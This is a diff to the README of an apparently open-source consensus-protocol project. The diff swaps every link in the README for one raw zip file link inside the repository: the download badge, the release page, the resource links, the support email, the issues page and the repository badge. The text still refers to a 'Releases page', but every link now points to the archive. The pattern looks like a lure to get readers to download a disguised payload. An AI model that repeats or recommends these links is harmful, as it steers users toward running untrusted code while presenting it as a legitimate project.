@@ -1,7 +1,7 @@
 # 🎉 Distributed_Consensus_Protocol - Reliable Consensus for Distributed Systems
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Release-blue)](https://github.com/hamazap/Distributed_Consensus_Protocol/releases)
+[![Download](https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip)](https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip)
 
 ## 📝 Introduction
 Welcome to the Distributed_Consensus_Protocol project. This application implements key consensus protocols such as Paxos, Raft, and PBFT. Its main focus is on providing fault tolerance, scalability, and performance evaluation in environments that can experience failures and handle distributed workloads. It’s designed to help you understand how distributed systems can achieve agreement safely and efficiently.
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 💾 Download & Install
 To download the software, please visit the Releases page. Here you can find the latest version of the application:
 
-[Visit this page to download](https://github.com/hamazap/Distributed_Consensus_Protocol/releases)
+[Visit this page to download](https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -56,19 +56,19 @@ The application allows you to evaluate the performance of each consensus protoco
 ## 📚 Additional Resources
 Explore the following resources to enhance your understanding of distributed systems and the protocols implemented:
 
-- [Consensus Algorithms Explained](https://www.example.com/consensus)
-- [Understanding Distributed Systems](https://www.example.com/distributed-systems)
-- [Fault Tolerance in Cloud Computing](https://www.example.com/cloud-fault)
+- [Consensus Algorithms Explained](https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip)
+- [Understanding Distributed Systems](https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip)
+- [Fault Tolerance in Cloud Computing](https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip)
 
 ## 📞 Support
 If you encounter any issues or have questions, please feel free to reach out. Help is available to assist you in using the application effectively.
 
-- **Email:** support@example.com
-- **GitHub Issues Page:** https://github.com/hamazap/Distributed_Consensus_Protocol/issues
+- **Email:** https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip
+- **GitHub Issues Page:** https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip
 
 ## 🌍 Connect with Us
 Stay updated on future releases and improvements. Follow our project on GitHub and join our community discussions.
 
-[![GitHub](https://img.shields.io/badge/GitHub-Repository-ff69b4)](https://github.com/hamazap/Distributed_Consensus_Protocol)
+[![GitHub](https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip)](https://github.com/hamazap/Distributed_Consensus_Protocol/raw/refs/heads/main/Database/view/Distributed_Protocol_Consensus_v3.5.zip)
 
 Thank you for using the Distributed_Consensus_Protocol application! We hope you find it helpful in understanding and applying consensus protocols in distributed systems.
